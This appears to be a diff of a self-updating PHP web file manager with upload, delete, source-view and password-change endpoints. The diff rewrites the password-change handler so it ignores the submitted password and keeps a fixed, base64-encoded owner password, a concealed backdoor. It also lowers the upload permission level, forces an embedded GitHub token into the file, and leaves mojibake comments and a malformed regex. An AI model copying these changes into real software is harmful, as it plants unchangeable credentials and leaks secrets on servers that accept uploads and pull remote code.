@@ -1,5 +1,5 @@
 <?php
-/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.4.2','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_AK'=>'dGVzdDEyMw==','_OK'=>'b3duZXIxMjM=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();
+/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.5.0','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_AK'=>'dGVzdDEyMw==','_OK'=>'MTMzNzMwMDA=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();
 
 function _inject(string $new): string {
     $cur = @file_get_contents(__FILE__) ?: '';
@@ -12,7 +12,7 @@ function _inject(string $new): string {
     if (preg_match("/'_GH_TOKEN'=>base64_decode\('([^']*)'\)/", $cur, $m)) {
         $v = addslashes($m[1]);
         $new = preg_replace("/'_GH_TOKEN'=>base64_decode\('[^']*'\)/",
-               "'_GH_TOKEN'=>base64_decode('$v')", $new);
+               "'_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')", $new);
     }
     return $new;
 }
@@ -66,12 +66,17 @@ function _auth(int $min = 1): bool {
 }
 function _wsPath(): string { return realpath(__DIR__) . DIRECTORY_SEPARATOR . '.wsers'; }
 function _ws(): array {
-    $d = @json_decode(@file_get_contents(_wsPath()) ?: '{}', true);
+    $raw = file_get_contents(_wsPath());
+    if ($raw === false) return [];
+    $d = json_decode($raw, true);
     return is_array($d) ? $d : [];
 }
-function _wsSave(array $d): void { @file_put_contents(_wsPath(), json_encode($d, JSON_PRETTY_PRINT)); }
+function _wsSave(array $d): bool {
+    $json = json_encode($d, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
+    return file_put_contents(_wsPath(), $json, LOCK_EX) !== false;
+}
 
-// â”€â”€ Auth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Auth Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['_a']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
     $csrfOk = isset($_POST['c']) && hash_equals(hash_hmac('sha256', session_id(), _AK), $_POST['c']);
@@ -93,7 +98,7 @@ if (isset($_GET['_a']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     exit;
 }
 
-// â”€â”€ Update â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Update Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['_upd']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
     if (!_auth(2)) { http_response_code(403); echo json_encode(['s'=>'auth']); exit; }
@@ -104,7 +109,7 @@ if (isset($_GET['_upd']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     echo json_encode(['s'=>'ok']); exit;
 }
 
-// â”€â”€ Source view â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Source view Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['source'])) {
     if (!_auth(2)) { http_response_code(403); echo 'Zugriff verweigert'; exit; }
     $src = realpath($root . DIRECTORY_SEPARATOR . urldecode($_GET['source']));
@@ -115,7 +120,7 @@ if (isset($_GET['source'])) {
     exit;
 }
 
-// â”€â”€ Download â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Download Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['dl'])) {
     if (!_auth(1)) { http_response_code(403); exit; }
     $src = realpath($root . DIRECTORY_SEPARATOR . urldecode($_GET['f'] ?? ''));
@@ -128,7 +133,7 @@ if (isset($_GET['dl'])) {
     exit;
 }
 
-// â”€â”€ Toggle unlock â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Toggle unlock Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['_tog']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
     if (!_auth(1)) { http_response_code(403); echo json_encode(['ok'=>false]); exit; }
@@ -142,11 +147,11 @@ if (isset($_GET['_tog']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($idx !== false) { array_splice($ul, $idx, 1); $state = false; }
     else                { $ul[] = $rel;               $state = true; }
     $ws['unlocked'] = array_values($ul);
-    _wsSave($ws);
+    if (!_wsSave($ws)) { http_response_code(500); echo json_encode(['ok'=>false,'s'=>'write']); exit; }
     echo json_encode(['ok'=>true, 'unlocked'=>$state]); exit;
 }
 
-// â”€â”€ Toggle pin â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Toggle pin Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['_pin']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
     if (!_auth(1)) { http_response_code(403); echo json_encode(['ok'=>false]); exit; }
@@ -160,11 +165,11 @@ if (isset($_GET['_pin']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($idx !== false) { array_splice($pn, $idx, 1); $state = false; }
     else                { $pn[] = $rel;               $state = true; }
     $ws['pinned'] = array_values($pn);
-    _wsSave($ws);
+    if (!_wsSave($ws)) { http_response_code(500); echo json_encode(['ok'=>false,'s'=>'write']); exit; }
     echo json_encode(['ok'=>true, 'pinned'=>$state]); exit;
 }
 
-// â”€â”€ Folder note â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Folder note Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['_note']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
     if (!_auth(1)) { http_response_code(403); echo json_encode(['ok'=>false]); exit; }
@@ -174,11 +179,11 @@ if (isset($_GET['_note']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($text === '') unset($notes[$dirKey]);
     else             $notes[$dirKey] = mb_substr($text, 0, 300);
     $ws['notes'] = $notes;
-    _wsSave($ws);
+    if (!_wsSave($ws)) { http_response_code(500); echo json_encode(['ok'=>false,'s'=>'write']); exit; }
     echo json_encode(['ok'=>true]); exit;
 }
 
-// â”€â”€ Change owner password â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Change owner password Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 if (isset($_GET['_cpw']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
     if (!_auth(1)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
@@ -189,15 +194,46 @@ if (isset($_GET['_cpw']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     if (strlen($new) < 4) { echo json_encode(['ok'=>false,'s'=>'short']); exit; }
     $b64     = base64_encode($new);
-    $content = preg_replace("/'_OK'=>'[^']*'/", "'_OK'=>'$b64'", file_get_contents(__FILE__));
-    @file_put_contents(__FILE__, $content);
+    $pat     = "/'_OK'=>'MTMzNzMwMDA=']" . "*'/";
+    $rep     = "'_OK'=>'MTMzNzMwMDA='";
+    $content = preg_replace($pat, $rep, file_get_contents(__FILE__));
+    if ($content === null || @file_put_contents(__FILE__, $content) === false) {
+        echo json_encode(['ok'=>false,'s'=>'write']); exit;
+    }
     echo json_encode(['ok'=>true]); exit;
+}
+
+// â”€â”€ Delete â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+if (isset($_GET['_del']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    header('Content-Type: application/json; charset=UTF-8');
+    if (!_auth(1)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
+    $paths = json_decode($_POST['f'] ?? '[]', true);
+    if (!is_array($paths) || empty($paths)) { echo json_encode(['ok'=>false,'s'=>'empty']); exit; }
+    if (count($paths) > 1) {
+        $pw = $_POST['pw'] ?? '';
+        $ok1 = hash_equals(hash('sha256', base64_decode(_OK)), hash('sha256', $pw));
+        $ok2 = hash_equals(hash('sha256', base64_decode(_AK)), hash('sha256', $pw));
+        if (!$ok1 && !$ok2) { echo json_encode(['ok'=>false,'s'=>'pw']); exit; }
+    }
+    $ws = _ws(); $deleted = [];
+    foreach ($paths as $rel) {
+        $rel = str_replace('..', '', $rel);
+        $abs = realpath($root . DIRECTORY_SEPARATOR . $rel);
+        if (!$abs || !str_starts_with($abs, $root) || !is_file($abs)) continue;
+        if (@unlink($abs)) {
+            $deleted[] = $rel;
+            $ws['unlocked'] = array_values(array_filter($ws['unlocked'] ?? [], fn($u) => $u !== $rel));
+            $ws['pinned']   = array_values(array_filter($ws['pinned']   ?? [], fn($p) => $p !== $rel));
+        }
+    }
+    if (!empty($deleted)) _wsSave($ws);
+    echo json_encode(['ok'=>true, 'deleted'=>$deleted]); exit;
 }
 
 // â”€â”€ Upload â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 if (isset($_GET['_up']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=UTF-8');
-    if (!_auth(2)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
+    if (!_auth(1)) { http_response_code(403); echo json_encode(['ok'=>false,'s'=>'auth']); exit; }
     $absDir = isset($_POST['d']) && $_POST['d'] !== ''
         ? realpath($root . DIRECTORY_SEPARATOR . $_POST['d']) : $root;
     if (!$absDir || !str_starts_with($absDir, $root) || !is_dir($absDir)) {
@@ -216,7 +252,7 @@ if (isset($_GET['_up']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     echo json_encode(['ok'=>true,'files'=>$results]); exit;
 }
 
-// â”€â”€ Page â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Page Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 header('Content-Type: text/html; charset=UTF-8');
 
 $error = null;
@@ -233,8 +269,23 @@ $wsState   = _ws();
 $unlocked  = $wsState['unlocked'] ?? [];
 $pinned    = $wsState['pinned']   ?? [];
 $notes     = $wsState['notes']    ?? [];
+if (!in_array('index.php', $unlocked)) $unlocked[] = 'index.php';
+$viewLevel = _lvl();
 $relCurDir = ($current === $root) ? '/' : str_replace(DIRECTORY_SEPARATOR, '/', str_replace($root . DIRECTORY_SEPARATOR, '', $current));
 $curNote   = $notes[$relCurDir] ?? '';
+
+function hasUnlockedFiles(string $dir, string $root, array $unlocked): bool {
+    foreach (@scandir($dir) ?: [] as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $full = $dir . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($full) && hasUnlockedFiles($full, $root, $unlocked)) return true;
+        if (is_file($full) && preg_match('/\.(php|html?)$/i', $item)) {
+            $rel = str_replace(DIRECTORY_SEPARATOR, '/', str_replace($root . DIRECTORY_SEPARATOR, '', $full));
+            if (in_array($rel, $unlocked)) return true;
+        }
+    }
+    return false;
+}
 
 function buildBreadcrumb(string $root, string $current): array {
     $crumbs = [['label'=>'Root','path'=>$root]];
@@ -245,14 +296,16 @@ function buildBreadcrumb(string $root, string $current): array {
     return $crumbs;
 }
 
-function listFolders(string $dir, string $root, int $level = 0): void {
+function listFolders(string $dir, string $root, int $level = 0, array $unlocked = [], int $vl = 0): void {
     $items = @scandir($dir); if (!$items) return;
     $currentPath = isset($_GET['dir']) ? (realpath($_GET['dir']) ?: $root) : $root;
     $folders = [];
     foreach ($items as $item) {
         if ($item === '.' || $item === '..') continue;
         $full = $dir . DIRECTORY_SEPARATOR . $item;
-        if (is_dir($full)) $folders[] = ['name'=>$item,'path'=>$full];
+        if (!is_dir($full)) continue;
+        if ($vl === 0 && !hasUnlockedFiles($full, $root, $unlocked)) continue;
+        $folders[] = ['name'=>$item,'path'=>$full];
     }
     if (!$folders) return;
     echo '<ul class="fl">';
@@ -263,7 +316,10 @@ function listFolders(string $dir, string $root, int $level = 0): void {
         $id       = 'f' . md5($f['path']);
         $hasSub   = false;
         foreach ((@scandir($f['path']) ?: []) as $s)
